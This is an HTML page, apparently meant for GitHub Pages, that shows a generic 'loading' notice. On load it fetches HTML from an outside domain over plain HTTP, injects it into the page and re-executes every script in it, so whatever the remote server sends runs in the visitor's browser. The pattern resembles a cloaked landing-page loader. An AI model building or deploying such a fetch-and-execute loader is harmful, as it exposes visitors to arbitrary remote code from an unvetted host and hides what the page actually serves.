<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>正在加载内容...</title>
    <style>
        /* 让容器全屏显示 */
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: auto; }
        #app { width: 100%; min-height: 100%; }
        /* 简单的加载遮罩 */
        #loader { text-align: center; padding-top: 50px; font-family: sans-serif; color: #666; }
    </style>
</head>
<body>

    <div id="loader">正在加载资源，请稍候...</div>
    <div id="app"></div>

    <script>
        // 你的服务器端落地页入口地址 (确保是 HTTP 或 HTTPS，取决于 GitHub 页面环境)
        const targetUrl = 'http://kmkm.rrgnf.cn/landing.php'; 

        async function initPage() {
            try {
                // 发起请求拉取内容
                const response = await fetch(targetUrl);
                const htmlData = await response.text();
                
                // 将拉取到的内容注入到 #app div 中
                document.getElementById('app').innerHTML = htmlData;
                document.getElementById('loader').style.display = 'none';

                // 尝试执行拉取回来的页面中的 JS
                const scripts = document.getElementById('app').querySelectorAll('script');
                scripts.forEach(oldScript => {
                    const newScript = document.createElement('script');
                    Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
                    newScript.appendChild(document.createTextNode(oldScript.innerHTML));
                    document.body.appendChild(newScript);
                });

            } catch (err) {
                document.getElementById('loader').innerHTML = "加载失败，请检查服务器跨域配置。";
                console.error("加载错误:", err);
            }
        }

        initPage();
    </script>
</body>
</html>
